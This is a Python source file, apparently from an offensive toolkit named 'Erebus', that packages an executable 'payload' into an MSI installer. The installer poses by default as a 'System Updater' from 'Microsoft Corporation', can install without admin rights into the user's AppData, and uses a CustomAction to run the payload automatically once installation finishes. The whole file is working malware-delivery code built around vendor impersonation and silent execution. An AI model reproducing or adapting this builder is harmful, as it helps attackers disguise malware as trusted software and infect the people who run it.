"""
MSI Container Generator for Erebus Payload
Features:
- Admin (Machine) vs User (No-Admin) install scopes
- Auto-execution via CustomAction
- Dependency bundling
"""

import pathlib
import subprocess
import uuid
import tempfile


def build_msi(build_path: pathlib.Path,
              app_name: str = "System Updater",
              manufacturer: str = "Microsoft Corporation",
              install_scope: str = "User") -> pathlib.Path:
    """
    Wraps the payload into an MSI.
    
    Args:
        app_name (str): Name of the Application
        manufacturer (str): Name of the manufacturer
        install_scope (str): "User" (No Admin, AppData) or "Machine" (Admin, ProgramFiles)
    """
    version = "1.0.0.0"
    upgrade_code = str(uuid.uuid4())
    component_guid = str(uuid.uuid4())
    
    payload_dir = build_path / "payload"
    payload_exe = payload_dir / "erebus.exe"
    if not payload_exe.exists():
        try:
            payload_exe = next(p for p in payload_dir.iterdir() if p.is_file() and p.suffix.lower() == ".exe")
        except StopIteration:
            raise RuntimeError("No .exe payload found in payload directory!")

    msi_path = build_path / "container" / "msi" / "erebus.msi"
    msi_path.parent.mkdir(parents=True, exist_ok=True)
    
    if install_scope.lower() == "machine":
        target_dir_id = "ProgramFilesFolder"
        package_scope = 'InstallScope="perMachine"'
        root_dir_name = "SourceDir"
    else:
        target_dir_id = "LocalAppDataFolder" 
        package_scope = 'InstallScope="perUser"'
        root_dir_name = "SourceDir"

    files_xml = ""
    main_exe_id = "PayloadEXE"
    
    for file in payload_dir.iterdir():
        if file.is_file() and file.name != msi_path.name:
            file_id = f"File_{uuid.uuid4().hex[:8]}"
            is_main = (file.name == payload_exe.name)
            
            if is_main:
                current_id = main_exe_id
                keypath = ''
            else:
                current_id = file_id
                keypath = ''

            files_xml += f'<File Id="{current_id}" Source="{file.absolute()}" {keypath} />\n'

    wix_xml = f"""<?xml version="1.0" encoding="utf-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
    <Product Id="*" UpgradeCode="{upgrade_code}" Name="{app_name}" Version="{version}" Manufacturer="{manufacturer}" Language="1033">
        <Package InstallerVersion="200" Compressed="yes" Comments="Installer" {package_scope} />
        <Media Id="1" Cabinet="product.cab" EmbedCab="yes" />

        <Directory Id="TARGETDIR" Name="{root_dir_name}">
            <Directory Id="{target_dir_id}">
                <Directory Id="INSTALLLOCATION" Name="{app_name}">
                    <Component Id="MainComponent" Guid="{component_guid}">
                        <!-- Critical for Per-User installs to create the folder key -->
                        <RegistryValue Root="HKCU" Key="Software\\{manufacturer}\\{app_name}" Name="installed" Type="integer" Value="1" KeyPath="yes"/>
                        {files_xml}
                    </Component>
                </Directory>
            </Directory>
        </Directory>

        <Feature Id="ProductFeature" Title="{app_name}" Level="1">
            <ComponentRef Id="MainComponent" />
        </Feature>

        <CustomAction Id="LaunchApp" FileKey="{main_exe_id}" ExeCommand="" Return="asyncNoWait" />
        
        <InstallExecuteSequence>
            <Custom Action="LaunchApp" After="InstallFinalize">NOT Installed</Custom>
        </InstallExecuteSequence>
    </Product>
</Wix>
"""

    try:
        with tempfile.TemporaryDirectory() as temp_dir:
            wxs_path = pathlib.Path(temp_dir) / "installer.wxs"
            wxs_path.write_text(wix_xml, encoding="utf-8")
            
            cmd = ["wixl", "-o", str(msi_path), str(wxs_path)]
            subprocess.check_output(cmd, stderr=subprocess.STDOUT)
            
            if not msi_path.exists():
                raise RuntimeError("MSI file was not created.")
            return msi_path

    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"MSI Build Failed:\n{e.output.decode()}")
